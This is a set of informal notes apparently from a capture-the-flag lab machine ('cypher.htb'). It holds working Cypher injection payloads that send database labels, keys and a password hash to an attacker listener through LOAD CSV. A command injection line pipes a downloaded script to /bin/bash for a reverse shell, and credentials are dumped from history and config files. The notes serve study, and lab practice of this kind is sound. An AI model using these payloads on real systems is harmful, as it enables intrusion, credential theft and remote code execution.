___



theres login page but I have no creds

*this is interesting*
307      GET        0l        0w        0c http://cypher.htb/api/ => http://cypher.htb/api/api


*auths user at this endpoint*
form action="[/api/auth](view-source:http://cypher.htb/api/auth)" method="POST">



*view source here* <== using neo4j database
view-source:http://cypher.htb/login



*the script *
<script> // TODO: don't store user accounts in neo4j function doLogin(e) { e.preventDefault(); var username = $("#usernamefield").val(); var password = $("#passwordfield").val(); $.ajax({ url: '/api/auth', type: 'POST', contentType: 'application/json', data: JSON.stringify({ username: username, password: password }), success: function (r) { window.location.replace("/demo"); }, error: function (r) { if (r.status == 401) { notify("Access denied"); } else { notify(r.responseText); } } }); }

*neo4j injection<===!!!!!*





*check these out*
307      GET        0l        0w        0c http://cypher.htb/api => http://cypher.htb/api/docs

301      GET        7l       12w      178c http://cypher.htb/testing => http://cypher.htb/testing/

200      GET       17l      139w     9977c http://cypher.htb/testing/custom-apoc-extension-1.0-SNAPSHOT.jar

200      GET     5632l    33572w  2776750c http://cypher.htb/us.png



TODO :
- cypher injection
- check out endpoints api looks interesting
-  ferox fuzzing -> /api endpoint?
- fuzz subdomains <- none found
- check out cookies, inspect around more/ network requests



Neo4j is using APOC (awesome procedure calls) 


====> its using a custom function for some functionality that I would be able to call using cypher !!!!



*neo4j ver*
 <neo4j.version>5.23.0</neo4j.version>

*maven ver*
<artifactId>maven-compiler-plugin</artifactId>
<version>3.8.1</version>

*maven plug in ver*
 <artifactId>maven-shade-plugin</artifactId>
<version>3.2.4</version>




*this is the custom function being used!!!* -> its taking user input

public Stream getUrlStatusCode(CustomFunctions this, String url) throws java.lang.Exception


function calls -> /bin/bash -c user_input !!!!






*this is the other custom function* -> prints "hello, {user_input}"
/* Flags:
     ACC_PUBLIC
   
   public Stream helloWorld(String name)  */




-> rev shell!!!!!!

*need to do a cipher injection call the custom function, then bypass the input filters on the java code and execute /bin/bash -c reverse shell*




com.cypher.neo4j.helloWorld()

com.cypher.neo4j.getUrlStatusCode()




scalar function

MATCH (n:Member)
RETURN org.neo4j.function.example.join(collect(n.name)) AS members



aggregation function
MATCH (n:Member)
RETURN org.neo4j.function.example.longestString(n.name) AS member




*error dumps the query statement*

Traceback (most recent call last): File "/app/app.py", line 142, in verify_creds results = run_cypher(cypher) File "/app/app.py", line 63, in run_cypher return [r.data() for r in session.run(cypher)] File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/session.py", line 314, in run self._auto_result._run( File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py", line 221, in _run self._attach() File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py", line 409, in _attach self._connection.fetch_message() File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py", line 178, in inner func(*args, **kwargs) File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt.py", line 860, in fetch_message res = self._process_message(tag, fields) File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt5.py", line 370, in _process_message response.on_failure(summary_metadata or {}) File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py", line 245, in on_failure raise Neo4jError.hydrate(**metadata) neo4j.exceptions.CypherSyntaxError: {code: Neo.ClientError.Statement.SyntaxError} {message: Variable `c` not defined (line 1, column 79 (offset: 78)) "MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'Spongebob' or 1=1 RETURN c//' return h.value as hash" ^} During handling of the above exception, another exception occurred: Traceback (most recent call last): File "/app/app.py", line 165, in login creds_valid = verify_creds(username, password) File "/app/app.py", line 151, in verify_creds raise ValueError(f"Invalid cypher query: {cypher}: {traceback.format_exc()}") ValueError: Invalid cypher query: MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'Spongebob' or 1=1 RETURN c//' return h.value as hash: Traceback (most recent call last): File "/app/app.py", line 142, in verify_creds results = run_cypher(cypher) File "/app/app.py", line 63, in run_cypher return [r.data() for r in session.run(cypher)] File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/session.py", line 314, in run self._auto_result._run( File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py", line 221, in _run self._attach() File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py", line 409, in _attach self._connection.fetch_message() File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py", line 178, in inner func(*args, **kwargs) File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt.py", line 860, in fetch_message res = self._process_message(tag, fields) File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt5.py", line 370, in _process_message response.on_failure(summary_metadata or {}) File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py", line 245, in on_failure raise Neo4jError.hydrate(**metadata) neo4j.exceptions.CypherSyntaxError: {code: Neo.ClientError.Statement.SyntaxError} {message: Variable `c` not defined (line 1, column 79 (offset: 78)) "MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'Spongebob' or 1=1 RETURN c//' return h.value as hash" ^}[](http://cypher.htb/login#)



*this is*

"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'Spongebob' or 1=1 RETURN c//' return h.value as hash"




MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin' return h.value as hash


*unkown function error*

admin' RETURN com.cypher.neo4j.getUrlStatusCode("this is a test") AS hash//


admin' RETURN SHOW FUNCTIONS YIELD name, signature, description, isBuiltIn WHERE isBuiltIn = false RETURN name, signature, description//



SHOW FUNCTIONS EXECUTABLE BY CURRENT USER YIELD *

```cypher
admin' RETURN 1 AS h UNION CALL db.labels() YIELD label AS h//
```


MATCH (u:USER)-[:SECRET]->(h:SHA1) WHERE u.name = '' OR 1=1 WITH 1 AS dummy CALL { SHOW FUNCTIONS YIELD name, isBuiltIn WHERE isBuiltIn = false RETURN name } RETURN dummy // ' RETURN h.value AS hash


admin' OR 1=1 WITH 1 AS dummy CALL { SHOW FUNCTIONS YIELD name, isBuiltIn WHERE isBuiltIn = false RETURN name } RETURN dummy //



*take a look at this*

https://hackmd.io/@Chivato/rkAN7Q9NY



admin' OR 1=1 RETURN 1 AS dummy // SHOW FUNCTIONS YIELD name, isBuiltIn WHERE isBuiltIn = false RETURN name //'


admin' OR 1=1 RETURN 1 AS dummy // SHOW FUNCTIONS YIELD name, isBuiltIn WHERE isBuiltIn = false RETURN LOAD CSV FROM 'http://10.10.14.23:8000/'+name//'



`MATCH (n) WITH 1337 AS x CALL db.labels() YIELD label AS d LOAD CSV FROM 'http://6z6kk6h009jysbrl8ahw89ji99f03p.burpcollaborator.net/'+d AS y RETURN y`




admin' OR 1=1 WITH 1 AS dummy CALL {MATCH(n) WITH l337 as x CALL db.labels() YIELD label AS d LOAD CSV FROM} RETURN dummy//




*base payload* (fill in inside call)
admin' OR 1=1 WITH 1 AS dummy CALL {} RETURN dummy//



admin' OR 1=1 RETURN com.cypher.neo4j.apoc.helloWorld() AS h//

HelloWorldProcedure


com.cypher.neo4j.apoc.HelloWorldProcedure()
com.cypher.neo4j.apoc.helloWorld()

com.cypher.neo4j.apoc.CustomFunctions()
com.cypher.neo4j.apoc.getUrlStatusCode()


```cypher
CALL db.labels()
admin' OR 1=1 WITH 1 AS dummy CALL {db.labels()} RETURN dummy//
```

HelloWorldProcedure$HelloWorldOutput



admin' OR 1=1 WITH 1 as dummy CALL{CREATE (n:Account) SET n.id=1, n.username="admin",n.admin=False,n.password="admin" RETURN n} RETURN dummy//



*read only*
{message: No write operations are allowed on this database. The database is in read-only mode on this Neo4j instance.}



```
CALL apoc.custom.list
```





*THIS WORKED* !!!!!!!!!!!

admin' OR 1=1 WITH 1 AS x CALL db.labels() YIELD label AS d  LOAD CSV FROM 'http://10.10.14.23:8000/?label=' + d AS y RETURN x AS hash//




MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin' return h.value as hash

*these are "tables"*
^[i10.10.11.57 - - [28/Jun/2025 20:05:04] "GET /?label=USER HTTP/1.1" 200 -
10.10.11.57 - - [28/Jun/2025 20:05:04] "GET /?label=HASH HTTP/1.1" 200 -
10.10.11.57 - - [28/Jun/2025 20:05:05] "GET /?label=DNS_NAME HTTP/1.1" 200 -
10.10.11.57 - - [28/Jun/2025 20:05:05] "GET /?label=SHA1 HTTP/1.1" 200 -
10.10.11.57 - - [28/Jun/2025 20:05:05] "GET /?label=SCAN HTTP/1.1" 200 -
10.10.11.57 - - [28/Jun/2025 20:05:06] "GET /?label=ORG_STUB HTTP/1.1" 200 -
10.10.11.57 - - [28/Jun/2025 20:05:06] "GET /?label=IP_ADDRESS HTTP/1.1" 200 -





*holly fucking shit, a user and a hash*
10.10.11.57 - - [28/Jun/2025 20:10:14] "GET /?u=graphasm HTTP/1.1" 200 -
10.10.11.57 - - [28/Jun/2025 20:11:16] "GET /?name=graphasm HTTP/1.1" 200 -
10.10.11.57 - - [28/Jun/2025 20:16:11] "GET /?hash=9f54ca4c130be6d529a56dee59dc2b2090e43acf HTTP/1.1" 200 -



*got hash like this*
admin' OR 1=1 WITH 1 AS x MATCH (h:SHA1)  LOAD CSV FROM 'http://10.10.14.23:8000/?hash=' + h.value AS r  RETURN x AS hash//



*got hash like this another attempt*
admin' OR 1=1 WITH 1 AS x MATCH (h:HASH)  LOAD CSV FROM 'http://10.10.14.23:8000/?hash=' + h AS r  RETURN x AS hash//

/?user=9f54ca4c130be6d529a56dee59dc2b2090e43acf




*this worked to return keys of each node*
admin' OR 1=1 WITH 1 AS x  MATCH (h:SHA1)  UNWIND keys(h) AS k  LOAD CSV FROM 'http://10.10.14.23:8000/?key=' + k AS r  RETURN x AS hash//





# enumeration
*key for sha1*
10.10.11.57 - - [30/Jun/2025 02:55:39] "GET /?key=value HTTP/1.1" 200 -
*key for user*
10.10.11.57 - - [30/Jun/2025 02:56:53] "GET /?key=name HTTP/1.1" 200 -

*key for DNS_NAME*
10.10.11.57 - - [30/Jun/2025 02:57:38] "GET /?key=resolved_hosts HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:39] "GET /?key=host HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:39] "GET /?key=module_sequence HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:39] "GET /?key=discovery_path HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:39] "GET /?key=timestamp HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:40] "GET /?key=parent_uuid HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:40] "GET /?key=web_spider_distance HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:40] "GET /?key=tags HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:41] "GET /?key=scope_distance HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:41] "GET /?key=id HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:41] "GET /?key=uuid HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:41] "GET /?key=module HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:42] "GET /?key=type HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:42] "GET /?key=parent_chain HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:42] "GET /?key=scope_description HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:42] "GET /?key=scan HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:43] "GET /?key=data HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:43] "GET /?key=parent HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:43] "GET /?key=discovery_context HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:44] "GET /?key=host HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:44] "GET /?key=id HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:44] "GET /?key=discovery_path HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:45] "GET /?key=timestamp HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:45] "GET /?key=resolved_hosts HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:45] "GET /?key=parent_uuid HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:45] "GET /?key=web_spider_distance HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:45] "GET /?key=tags HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:46] "GET /?key=scope_distance HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:46] "GET /?key=module_sequence HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:46] "GET /?key=uuid HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:47] "GET /?key=module HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:47] "GET /?key=scan HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:47] "GET /?key=type HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:48] "GET /?key=discovery_context HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:48] "GET /?key=parent_chain HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:50] "GET /?key=scope_description HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:51] "GET /?key=data HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:51] "GET /?key=parent HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:51] "GET /?key=host HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:51] "GET /?key=id HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:52] "GET /?key=discovery_path HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:52] "GET /?key=timestamp HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:52] "GET /?key=resolved_hosts HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:52] "GET /?key=parent_uuid HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 02:57:53] "GET /?key=web_spider_distance HTTP/1.1" 200 -



*SCAN KEYS*

10.10.11.57 - - [30/Jun/2025 03:02:47] "GET /?key=parent_uuid HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 03:02:47] "GET /?key=scope_distance HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 03:02:48] "GET /?key=uuid HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 03:02:48] "GET /?key=scan HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 03:02:48] "GET /?key=type HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 03:02:49] "GET /?key=web_spider_distance HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 03:02:49] "GET /?key=tags HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 03:02:49] "GET /?key=scope_description HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 03:02:49] "GET /?key=module HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 03:02:50] "GET /?key=timestamp HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 03:02:50] "GET /?key=parent HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 03:02:50] "GET /?key=discovery_context HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 03:02:51] "GET /?key=parent_chain HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 03:02:51] "GET /?key=module_sequence HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 03:02:51] "GET /?key=id HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 03:02:51] "GET /?key=discovery_path HTTP/1.1" 200 -



*ORG_STUB KEYS*
10.10.11.57 - - [30/Jun/2025 03:03:48] "GET /?key=discovery_path HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 03:03:48] "GET /?key=timestamp HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 03:03:49] "GET /?key=parent_uuid HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 03:03:49] "GET /?key=scope_distance HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 03:03:49] "GET /?key=module_sequence HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 03:03:49] "GET /?key=id HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 03:03:50] "GET /?key=uuid HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 03:03:50] "GET /?key=type HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 03:03:50] "GET /?key=web_spider_distance HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 03:03:51] "GET /?key=tags HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 03:03:51] "GET /?key=scope_description HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 03:03:51] "GET /?key=module HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 03:03:51] "GET /?key=discovery_context HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 03:03:52] "GET /?key=data HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 03:03:52] "GET /?key=parent HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 03:03:52] "GET /?key=parent_chain HTTP/1.1" 200 -
10.10.11.57 - - [30/Jun/2025 03:03:53] "GET /?key=scan HTTP/1.1" 200 -


10.10.11.57 - - [30/Jun/2025 03:06:40] "GET /?hash=SCAN:eb3cf8eb641dd2e8005128c2fee4b43e59fd7785 HTTP/1.1" 200 -





*THERE IS SOMETHING HERE!*
422      GET        1l        2w       91c http://cypher.htb/api/cypher
-> this is very interesting migth be able to pass in cypher queries here -> different db context???? maybe?????




I must be on the wrong database context!!! <- bc apoc is not available here even though it is defined in the file




*I can query the database here FUCKING HUGE!!!*
GET /api/cypher?query=test HTTP/1.1




SHOW DATABASE (there are 2 databases here) <===

[{"name":"neo4j","type":"standard","aliases":[],"access":"read-only","address":"localhost:7687","role":"primary","writer":true,"requestedStatus":"online","currentStatus":"online","statusMessage":"","default":true,"home":true,"constituents":[]},{"name":"system","type":"system","aliases":[],"access":"read-write","address":"localhost:7687","role":"primary","writer":true,"requestedStatus":"online","currentStatus":"online","statusMessage":"","default":false,"home":false,"constituents":[]}]




*SHOW+PROCEDURES * look what i just found mf

{"name":"custom.getUrlStatusCode","description":"Returns the HTTP status code for the given URL as a string","mode":"READ","worksOnSystem":false},

{"name":"custom.helloWorld","description":"A simple hello world procedure","mode":"READ","worksOnSystem":false},{



*and it works I can call it*
GET /api/cypher?query=CALL+custom.helloWorld("helloo")





name":"custom.getUrlStatusCode"
description":"Returns the HTTP status code for the given URL as a string",



*this is doing request back to me* (no input sanitization apparently now I need shell)
GET /api/cypher?query=CALL+custom.getUrlStatusCode("wget+10.10.14.23:7777") HTTP/1.1



# SHELL 

*fuck yes I GOT SHELL*
GET /api/cypher?query=CALL+custom.getUrlStatusCode("wget+10.10.14.23:7777/props.sh+|+/bin/bash") HTTP/1.1





cat .bash_history
neo4j-admin dbms set-initial-password cU4btyib.20xtCMCXkBmerhK

targets:
  - ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK
$ 



neo4j:SHA-256,6a4277a4653a8536cff2d6f44fc698621e237d33a0fa36a57c55fb3bfead7b48,3d19d683dc15384a6cae9dc840740e93116cae7b0786b9dfee4dbbacbc13a65c,1024:


*SYSTEM database could be something interesting I don't know whats on it*
*the neo4j is the one already enumerated*




*neo4j version*
Version: 5.24.1
Edition: Community


        "package_or_url": "bbot",
        "package_version": "2.1.0.4939rc0",
        "pip_args": [




*this is the bbot being used here*

https://github.com/blacklanternsecurity/bbot



*neo4j*
#   neo4j:
#     uri: bolt://localhost:7687



*GOT USER*

this is the pass for graphasm <===
cU4btyib.20xtCMCXkBmerhK



#   neo4j:
#     username: neo4j
#     password: bbotislife



*containernerd is on the machine so there are definitely things running on containers here*

port 8000 is running the container app


root        1755  0.1  0.6  98068 26012 ?        Ssl  Jun30   1:22  \_ /usr/local/bin/python3.9 /usr/local/bin/uvicorn app:app --reload --host 0.0.0.0 --port 8000 --root-path /api




*redoc*
ReDoc Version: 2.0.0-rc.75  
Commit: d7440fb


# priv esc

(redoc is running as root) => [CVE-2024-57083](https://www.cve.org/CVERecord?id=CVE-2024-57083)

there is  a cve here that i can use for RCE

but how tf i do this


*this is where the error is*
http://localhost:8000/redoc



also there is a script is loading. can I supply this .json file for it???
Failed to load http://localhost:8000/api/openapi.json: 404 Not Found





# root

was actually rlly easy sudo -l bbot can run as sudo


